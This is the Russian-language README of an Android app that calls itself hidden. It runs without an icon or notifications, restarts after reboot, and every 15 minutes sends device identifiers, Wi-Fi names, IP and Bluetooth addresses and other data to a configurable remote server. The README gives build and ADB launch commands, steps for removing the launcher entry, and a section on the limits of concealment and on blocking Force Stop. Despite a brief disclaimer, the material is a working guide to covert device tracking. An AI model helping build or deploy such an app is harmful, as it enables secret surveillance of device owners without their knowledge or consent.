# AndroidDataCollector

Скрытое Android-приложение для автоматического сбора информации об устройстве и отправки её на удалённый сервер. Работает в фоне, не имеет иконки в лаунчере, автоматически запускается после перезагрузки устройства.

> **Предупреждение:** Проект предназначен исключительно для образовательных целей и мониторинга собственных устройств. Использование приложения для слежки за чужими устройствами без согласия владельца является незаконным.

---

## Содержание

- [Возможности](#Возможности)
- [Собираемые данные](#Собираемые-данные)
- [Технологический стек](#Технологический-стек)
- [Структура проекта](#Структура-проекта)
- [Требования](#Требования)
- [Установка и настройка](#Установка-и-настройка)
- [Сборка](#Сборка)
- [Использование](#Использование)
- [Конфигурация](#Конфигурация)
- [Поведение на разных версиях Android](#Поведение-на-разных-версиях-android)
- [Отладка](#Отладка)
- [Известные ограничения](#Известные-ограничения)
- [Формат отправляемого JSON](#Формат-отправляемого-JSON)

---

## Возможности

- **Расширенный сбор данных** — информация об устройстве, железе, сети, батарее, системе
- **Автоматическая отправка** на сервер через HTTP POST (JSON)
- **Периодический запуск** через WorkManager (каждые 15 минут)
- **Автозапуск после перезагрузки** устройства через `BootReceiver`
- **Скрытый режим** — приложение не отображается в лаунчере
- **Без уведомлений** — невидимая работа в фоне
- **Проверка сети** — отправка только при наличии интернет-соединения
- **Автоматические повторные попытки** при ошибках сети или сервера
- **Статистика устройства** — CPU, RAM, хранилище, камеры, экран и др.

---

## Собираемые данные

### Базовая информация об устройстве
| Поле                   | Описание                                             |
|------------------------|------------------------------------------------------|
| `android_id`           | Уникальный идентификатор устройства                  |
| `device.model`         | Производитель и модель (например, `Honeywell EDA52`) |
| `device.name`          | Имя устройства из настроек                           |
| `device.serial_number` | Серийный номер (если доступен)                       |

### Системная информация
| Поле                         | Описание                                 |
|------------------------------|------------------------------------------|
| `system.android_version`     | Версия Android (например, `Android 11`)  |
| `system.android_api_version` | Уровень API (например, `API 30`)         |
| `system.build_number`        | Номер сборки прошивки                    |
| `system.language`            | Язык системы (например, `ru-RU`)         |
| `system.timezone`            | Часовой пояс (например, `Europe/Moscow`) |
| `system.uptime`              | Время работы с момента загрузки          |
| `system.request_time`        | Время отправки запроса                   |

### Аппаратное обеспечение
| Поле                              | Описание                            |
|-----------------------------------|-------------------------------------|
| `hardware.processor`              | Количество ядер CPU                 |
| `hardware.processor_architecture` | Архитектура (например, `arm64-v8a`) |
| `hardware.ram_total`              | Общий объём ОЗУ                     |
| `hardware.ram_free`               | Свободная ОЗУ                       |
| `hardware.storage_total`          | Общий объём памяти                  |
| `hardware.storage_free`           | Свободная память                    |
| `hardware.cameras`                | Количество камер                    |
| `hardware.screen_resolution`      | Разрешение экрана                   |

### Сеть
| Поле                      | Описание                                                   |
|---------------------------|------------------------------------------------------------|
| `network.connection_type` | Тип подключения (Wi-Fi / Мобильная / Bluetooth / Ethernet) |
| `network.wifi_ssid`       | Имя Wi-Fi сети                                             |
| `network.wifi_bssid`      | BSSID точки доступа                                        |
| `network.mac_address`     | MAC-адрес сетевого интерфейса                              |
| `network.ip_addresses`    | Список IP-адресов                                          |
| `network.wifi_gateway`    | IP-адрес шлюза Wi-Fi                                       |
| `network.bluetooth`       | Имя Bluetooth и MAC-адрес                                  |

### Батарея
| Поле                  | Описание                                    |
|-----------------------|---------------------------------------------|
| `battery.level`       | Уровень заряда в процентах                  |
| `battery.status`      | Статус (Заряжается / Разряжается / Заряжен) |
| `battery.temperature` | Температура батареи в °C                    |

---

## Технологический стек

| Технология            | Назначение                            |
|-----------------------|---------------------------------------|
| **Kotlin**            | Основной язык разработки              |
| **Jetpack Compose**   | UI для экрана управления              |
| **Material 3**        | Дизайн интерфейса                     |
| **WorkManager**       | Периодическое выполнение задач в фоне |
| **Coroutines**        | Асинхронные операции                  |
| **OkHttp**            | HTTP-клиент для отправки данных       |
| **Gson**              | Сериализация в JSON                   |
| **AndroidX Core KTX** | Расширения Kotlin для Android         |

---

## Структура проекта

```
app/src/main/
├── java/com/extreme/androiddatacollector/
│   ├── MainActivity.kt              # UI с кнопками управления
│   ├── BootReceiver.kt              # Автозапуск после перезагрузки
│   ├── DataCollectionWorker.kt      # WorkManager-воркер для сбора данных
│   ├── DataCollectionService.kt     # Фоновый сервис (альтернативный вариант)
│   ├── DataCollector.kt             # Сбор информации об устройстве
│   └── DataSender.kt                # Отправка данных на сервер
├── res/
│   ├── layout/                      # XML-разметки (если используются)
│   ├── values/                      # Строки, темы, цвета
│   └── mipmap/                      # Иконки приложения
└── AndroidManifest.xml              # Манифест с разрешениями
```

### Описание ключевых классов

#### `BootReceiver`
BroadcastReceiver, перехватывающий событие `BOOT_COMPLETED`. При загрузке устройства планирует периодическую задачу через WorkManager.

#### `DataCollectionWorker`
`CoroutineWorker`, выполняющий основную работу:
1. Проверяет наличие интернет-соединения
2. Собирает данные через `DeviceDataCollector`
3. Отправляет JSON на сервер через `DataSender`
4. При ошибке возвращает `Result.retry()` для повторной попытки

#### `DeviceDataCollector`
Объект, собирающий всю информацию об устройстве через системные API Android. Все операции обёрнуты в `runCatching` для безопасной обработки исключений.

#### `DataSender`
Объект, отправляющий собранные данные на сервер методом POST с JSON-телом. Использует OkHttp с таймаутами 10 секунд.

#### `DataCollectionService`
Альтернативный вариант реализации через `Service`. Используется для точных интервалов (менее 15 минут) или в случаях, когда WorkManager не подходит.

---

## Требования

| Параметр         | Значение        |
|------------------|-----------------|
| **Min SDK**      | 30 (Android 11) |
| **Target SDK**   | 36              |
| **Compile SDK**  | 36              |
| **Java Version** | 11              |
| **Gradle**       | 8.x             |
| **Kotlin**       | 2.x             |

---

## Установка и настройка

### 1. Клонирование репозитория

```bash
git clone https://github.com/eXTrimeXT/AndroidDataCollector.git
cd AndroidDataCollector
```

### 2. Настройка сервера

Откройте файл `DataSender.kt` и измените константу `SERVER_URL` на адрес вашего сервера:

```kotlin
private const val SERVER_URL = "http://SERVER_IP:PORT/api/android-data/"
```

**Требования к серверу:**
- Должен принимать HTTP POST-запросы
- Должен обрабатывать JSON в теле запроса
- Должен возвращать HTTP 200/201 при успешном приёме
- Для HTTP (не HTTPS) должен быть разрешён cleartext-трафик (уже настроено в манифесте)

### 3. Разрешения в AndroidManifest.xml

Все необходимые разрешения уже добавлены в манифест:

```xml
<uses-permission android:name="android.permission.INTERNET" />
<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
<uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
<uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
<uses-permission android:name="android.permission.READ_PHONE_STATE" />
<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
<uses-permission android:name="android.permission.BLUETOOTH" android:maxSdkVersion="30" />
<uses-permission android:name="android.permission.BLUETOOTH_CONNECT" android:minSdkVersion="31" />
```

---

## Сборка

### Через Android Studio

1. Откройте проект в Android Studio
2. Дождитесь синхронизации Gradle
3. Выберите устройство или эмулятор
4. Нажмите **Run** (Shift + F10)

### Через командную строку

```bash
# Debug-сборка
./gradlew assembleDebug

# Release-сборка
./gradlew assembleRelease

# Установка на подключённое устройство
./gradlew installDebug
```

### Подпись для релиза

В проекте уже настроен debug-keystore. Для release-сборки создайте собственный keystore:

```bash
keytool -genkey -v -keystore release.keystore -alias mykey -keyalg RSA -keysize 2048 -validity 10000
```

---

## Использование

### Первый запуск

После установки приложение можно запустить одним из способов:

#### 1. Через ADB (рекомендуется для скрытого режима)

```bash
# Запустить MainActivity
adb shell am start -n com.extreme.androiddatacollector/.MainActivity

# Или напрямую запланировать работу WorkManager
adb shell am broadcast -a android.intent.action.BOOT_COMPLETED -n com.extreme.androiddatacollector/.BootReceiver
```

#### 2. Через UI

Если `MainActivity` имеет intent-filter `MAIN/LAUNCHER`, приложение появится в меню запуска. На экране будут две кнопки:
- **Запустить** — запускает сервис сбора данных
- **Остановить** — останавливает сервис

#### 3. Автоматически после перезагрузки

После первой установки и ручного запуска приложение будет автоматически запускаться при каждой перезагрузке устройства через `BootReceiver`.

### Проверка работы

#### Смотреть логи приложения
```bash
adb logcat -s DataCollectionWorker BootReceiver DataSender DataCollector
```

#### Проверить запланированные задачи WorkManager
```bash
adb shell dumpsys job_scheduler | grep com.extreme.androiddatacollector
```

---

## Конфигурация

### Интервал отправки данных

В `BootReceiver.kt` можно изменить интервал:

```kotlin
val workRequest = PeriodicWorkRequestBuilder<DataCollectionWorker>(
    15, TimeUnit.MINUTES  // Минимальный интервал WorkManager — 15 минут
)
```

> **Важно:** WorkManager имеет минимальный интервал **15 минут**. Если нужен более частый запуск (например, 20 секунд), используйте `DataCollectionService` вместо WorkManager.

### Задержка первого запуска

```kotlin
setInitialDelay(15, TimeUnit.SECONDS) // Первый запуск через 15 секунд после загрузки
```

### Политика перезаписи задач

```kotlin
ExistingPeriodicWorkPolicy.KEEP    // Сохранить существующую задачу
ExistingPeriodicWorkPolicy.REPLACE // Заменить существующую задачу
```

### Скрытие приложения из лаунчера

Чтобы скрыть иконку приложения, удалите intent-filter из `MainActivity` в `AndroidManifest.xml`:

```xml
<!-- Удалить этот блок -->
<intent-filter>
    <action android:name="android.intent.action.MAIN" />
    <category android:name="android.intent.category.LAUNCHER" />
</intent-filter>
```

---

## Поведение на разных версиях Android

### Android 11 (API 30)
- WorkManager работает корректно
- Автозапуск после перезагрузки работает
- Ограничения `NetworkType.CONNECTED` могут блокировать запуск сразу после загрузки
- Обычный `startService()` из Activity работает без проблем

### Android 12+ (API 31+)
- WorkManager работает
- Новые ограничения на запуск фоновых активностей
- Требуется `BLUETOOTH_CONNECT` для получения Bluetooth-информации

### Android 13+ (API 33+)
- WorkManager работает корректно
- Разрешение `POST_NOTIFICATIONS` не требуется для WorkManager
- Автозапуск стабилен

### Ограничения производителей

На некоторых устройствах необходимо вручную:
1. Включить **Автозапуск** для приложения
2. Отключить **Экономию батареи** для приложения
3. Разрешить **Работу в фоне**

Без этих настроек система может убивать фоновые процессы.

---

## Отладка

### Полезные команды ADB

```bash
# Логи приложения
adb logcat -s DataCollectionWorker BootReceiver DataSender DataCollector

# Состояние WorkManager
adb shell dumpsys job_scheduler | grep -A 10 com.extreme.androiddatacollector

# Список установленных приложений
adb shell pm list packages | grep androiddatacollector

# Принудительный запуск BootReceiver
adb shell am broadcast -a android.intent.action.BOOT_COMPLETED \
    -n com.extreme.androiddatacollector/.BootReceiver

# Проверка сетевых ограничений
adb shell dumpsys connectivity | grep -A 5 "Active networks"

# Установка
./gradlew installDebug

# Дать разрешение
adb shell pm grant com.gps.gpsdatacollector android.permission.ACCESS_FINE_LOCATION
adb shell pm grant com.gps.gpsdatacollector android.permission.ACCESS_COARSE_LOCATION

# Посмотреть логи
adb logcat -s DataCollectionService:D DataSender:D DataCollector:D

# Принудительный запуск службы через ADB:
adb shell am startservice -a ACTION_START -n com.extreme.androiddatacollector/.DataCollectionService
adb shell am start-foreground-service -a ACTION_START -n com.extreme.androiddatacollector/.DataCollectionService

```

### Типичные проблемы

| Проблема                                     | Решение                                               |
|----------------------------------------------|-------------------------------------------------------|
| `Constraints not met`                        | Проверить подключение к интернету                     |
| `app is in background`                       | Использовать `startForegroundService` или WorkManager |
| `Interval duration lesser than minimum`      | Установить интервал ≥ 15 минут для WorkManager        |
| Данные не отправляются                       | Проверить URL сервера и firewall                      |
| Приложение не запускается после перезагрузки | Включить автозапуск в настройках устройства           |

---

## Известные ограничения

### Android-система
- **WorkManager** имеет минимальный интервал 15 минут
- **Force Stop** через настройки полностью останавливает приложение до ручного запуска
- Производители могут агрессивно убивать фоновые процессы
- На Android 8+ нельзя запускать обычный `startService()` из фона

### Скрытность
- Приложение **нельзя** полностью скрыть из списка в Настройках → Приложения
- Кнопка **Остановить** в настройках всегда доступна пользователю
- Полная блокировка Force Stop требует прав Device Owner или системного приложения

### Сеть
- Некоторые сети могут блокировать HTTP-трафик (только HTTPS)
- MAC-адрес на Android 10+ всегда `02:00:00:00:00:00`
- Серийный номер недоступен без системных разрешений

---

## Формат отправляемого JSON

Пример тела POST-запроса:

```json
{
  "android_id": "adb816e29cfa6e24",
  "device": {
    "model": "Honeywell EDA52",
    "name": "EDA52ggg",
    "serial_number": null
  },
  "system": {
    "android_version": "Android 11",
    "android_api_version": "API 30",
    "build_number": "218.02.18.0299",
    "language": "ru-RU",
    "timezone": "Europe/Moscow",
    "uptime": "05:21:37",
    "request_time": "2026-06-04 14:17:15"
  },
  "hardware": {
    "processor": "8 cores",
    "processor_architecture": "arm64-v8a",
    "ram_total": "3.6 GB",
    "ram_free": "1.8 GB",
    "storage_total": "47.9 GB",
    "storage_free": "45.9 GB",
    "cameras": "2",
    "screen_resolution": "720 x 1440"
  },
  "network": {
    "connection_type": "Wi-Fi",
    "wifi_ssid": "MyNetwork",
    "wifi_bssid": "AA:BB:CC:DD:EE:FF",
    "mac_address": "00:11:22:33:44:55",
    "ip_addresses": "10.168.135.61",
    "wifi_gateway": "10.168.135.254",
    "bluetooth": "EDA52 (Hidden)"
  },
  "battery": {
    "level": "100%",
    "status": "Заряжен",
    "temperature": "31.0 °C"
  }
}
```